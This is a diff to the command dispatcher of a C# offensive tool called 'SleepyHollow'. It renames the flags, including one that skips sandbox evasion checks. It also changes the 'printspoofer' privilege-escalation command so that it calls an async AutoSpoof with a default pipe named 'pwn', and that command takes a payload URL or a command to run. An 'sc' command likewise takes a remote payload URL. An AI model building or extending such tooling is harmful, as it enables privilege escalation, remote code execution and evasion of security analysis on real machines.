@@ -1,4 +1,4 @@
-using SleepyHollow;
+﻿using SleepyHollow;
 #if !HEADLESS
 var commands = new Dictionary<string, Dictionary<string, string>>
 {
@@ -42,8 +42,8 @@ var commands = new Dictionary<string, Dictionary<string, string>>
 };
 var globalSwitches = new Dictionary<string, string>
 {
-    { "--skip-evasion", "do not perform sandbox evasion checks" },
-    { "--debug", "enable debug logging" }
+    { "skip-evasion", "do not perform sandbox evasion checks" },
+    { "debug", "enable debug logging" }
 };
 
 if (args.Length == 0)
@@ -109,7 +109,7 @@ switch (options["command"])
         }
         break;
     case "printspoofer":
-        var pipeName = options.ContainsKey("pipe") ? options["pipe"] : "\\\\.\\pipe\\test\\pipe\\spoolss";
+        var pipeName = options.ContainsKey("pipe") ? options["pipe"] : "pwn";
         var payloadUrl = options.ContainsKey("payload") ? options["payload"] : null;
         var executeCmd = options.ContainsKey("cmd") ? options["cmd"] : null;
         if (payloadUrl == null && executeCmd == null)
@@ -118,7 +118,7 @@ switch (options["command"])
             Environment.Exit(1);
         }
 
-        PrintSpoofer.Spoof(pipeName, payloadUrl, executeCmd);
+        await PrintSpoofer.AutoSpoof(pipeName, payloadUrl, executeCmd);
         break;
     case "sc":
         var url = options["payload"];
